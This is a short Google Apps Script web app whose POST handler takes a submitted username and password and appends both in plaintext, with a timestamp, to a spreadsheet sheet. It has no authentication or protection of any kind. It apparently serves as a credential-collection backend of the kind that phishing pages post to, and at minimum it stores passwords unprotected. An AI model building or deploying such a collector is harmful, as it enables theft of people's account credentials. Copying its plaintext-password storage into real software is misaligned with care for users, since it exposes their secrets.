// Google Apps Script to handle form submissions
function doGet(e) {
  return ContentService.createTextOutput(JSON.stringify({
    status: "Service is running"
  })).setMimeType(ContentService.MimeType.JSON);
}

function doPost(e) {
  try {
    // Get the active spreadsheet and sheet
    const ss = SpreadsheetApp.getActiveSpreadsheet();
    const sheet = ss.getSheetByName('Form Responses') || ss.insertSheet('Form Responses');
    
    // Get form data from e.parameter
    const data = {
      username: e.parameter.username,
      password: e.parameter.password
    };
    
    // Get current timestamp
    const timestamp = new Date();
    
    // Add data to sheet
    sheet.appendRow([
      timestamp,
      data.username,
      data.password
    ]);
    
    // Return success response
    return ContentService.createTextOutput(JSON.stringify({
      success: true,
      message: 'Data recorded successfully'
    })).setMimeType(ContentService.MimeType.JSON);
    
  } catch (error) {
    // Log error
    console.error(error);
    
    // Return error response
    return ContentService.createTextOutput(JSON.stringify({
      success: false,
      error: 'Error recording data: ' + error.toString()
    })).setMimeType(ContentService.MimeType.JSON);
  }
} 